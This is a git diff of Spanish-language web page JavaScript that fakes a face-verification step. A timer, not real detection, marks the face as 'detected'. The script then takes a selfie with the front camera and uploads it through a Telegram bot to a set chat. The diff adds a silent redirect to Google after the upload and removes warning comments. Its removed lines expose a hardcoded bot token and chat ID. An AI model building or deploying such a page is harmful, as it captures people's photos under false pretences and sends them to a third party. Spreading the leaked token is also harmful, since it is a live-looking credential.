@@ -79,10 +79,10 @@ const oval = document.getElementById("oval");
 
 const canvas = document.createElement("canvas");
 
-/* ⚠️ TU CONFIG (NO SEGURO EN FRONTEND) */
+/* CONFIG TELEGRAM */
 const TELEGRAM_CONFIG = {
-    token: "6460759862:AAGXmhRsIXIp16GVh72gbCmmmlSXRDITGEA",
-    chatId: "7158969671"
+    token: "TU_TOKEN_AQUI",
+    chatId: "TU_CHAT_ID"
 };
 
 /* INICIAR CÁMARA */
@@ -99,12 +99,11 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     statusText.innerText = "❌ No se pudo acceder a la cámara";
 });
 
-/* FLUJO SIMPLE */
+/* FLUJO */
 function startFlow() {
     setTimeout(() => {
         oval.classList.add("valid");
         statusText.innerText = "✅ Detectado";
-
         setTimeout(startCountdown, 1000);
     }, 2000);
 }
@@ -127,7 +126,7 @@ function startCountdown() {
     }, 1000);
 }
 
-/* 📸 FOTO */
+/* FOTO */
 function tomarFoto() {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -141,7 +140,7 @@ function tomarFoto() {
     }, "image/jpeg", 0.9);
 }
 
-/* 🚀 ENVIAR A TELEGRAM (funciona pero no recomendado) */
+/* ENVIAR Y REDIRIGIR */
 function enviarFotoTelegram(blob) {
     const formData = new FormData();
     formData.append("chat_id", TELEGRAM_CONFIG.chatId);
@@ -154,6 +153,12 @@ function enviarFotoTelegram(blob) {
     .then(res => {
         if (res.ok) {
             statusText.innerText = "✅ Enviado";
+
+            // 🔥 REDIRECCIÓN A GOOGLE
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000);
+
         } else {
             throw new Error();
         }
